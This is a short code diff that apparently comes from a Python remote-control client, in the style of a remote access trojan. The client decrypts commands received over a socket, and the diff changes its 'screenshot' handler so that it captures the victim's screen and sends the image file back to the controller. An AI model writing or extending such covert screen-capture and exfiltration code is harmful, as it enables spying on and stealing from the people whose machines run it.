@@ -39,7 +39,7 @@ def main():
         data = s.recv(1024)
         data = crypto.AES_decrypt(data, dh_key)
 
-        # seperate prompt into command and action
+        # separate prompt into command and action
         cmd, _, action = data.partition(' ')
 
         # stop client
@@ -98,10 +98,9 @@ def main():
         
         # take a screenshot
         elif cmd == 'screenshot':
-            results = screenshot.take_screenshot('screenshot.jpg')
-            s.send(crypto.AES_encrypt(results, dh_key))
-
-
+            fname = 'screenshot.jpg'
+            screenshot.take_screenshot(fname)
+            filesock.sendfile(s, fname, dh_key)
 
 if __name__ == '__main__':
     main()
